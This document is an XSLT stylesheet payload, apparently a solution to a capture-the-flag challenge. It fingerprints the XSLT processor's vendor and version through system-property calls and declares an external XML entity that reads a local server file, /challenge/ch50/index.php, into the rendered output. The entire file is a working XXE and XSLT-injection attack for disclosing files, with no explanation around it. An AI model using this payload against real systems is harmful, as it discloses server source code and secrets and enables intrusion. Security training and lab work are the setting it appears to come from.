<!DOCTYPE xsl:stylesheet [
 <!ENTITY index SYSTEM "file:///challenge/ch50/index.php" >] >

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  
  <xsl:template match="/">
    <html>
      <body>
        Version: <xsl:value-of select="system-property('xsl:version')" /><br />
        Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br/>
        Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/><br />
        <xsl:if test="system-property('xsl:product-name')">
          Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:product-version')">
          Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:is-schema-aware')">
          Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:supports-serialization')">
          Supports Serialization: <xsl:value-of select="system-property('xsl:supports-serialization')" /><br />
        </xsl:if>
        <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
          Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supports-backwards-compatibility')" /><br />
        </xsl:if>
        &index;
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
